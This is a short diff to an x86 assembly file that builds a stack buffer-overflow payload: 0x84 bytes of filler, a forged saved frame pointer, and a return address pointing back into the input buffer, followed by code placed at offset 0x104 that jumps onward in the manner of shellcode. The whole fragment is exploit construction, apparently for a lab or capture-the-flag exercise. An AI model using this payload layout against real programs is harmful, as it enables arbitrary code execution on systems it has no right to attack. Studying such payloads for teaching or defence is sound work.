@@ -6,6 +6,17 @@
 .globl main
 .type main, @function
 
+head0:			# <- begin of buf
+	.rept 0x84
+	.byte 0xFF
+	.endr
+.long 0xffffcd10	# <- ecx - 0x4 == &ret addr1 == ebp + 0x4 = buf + 0x88 + 0x4
+.long 0xffffffff	# <- ebp
+
+.long 0xffffc584	# <- ret addr1 == input + 0x104
+.byte 0x00
+
+.org 0x104
 main:
 	jmp	calladdr
 
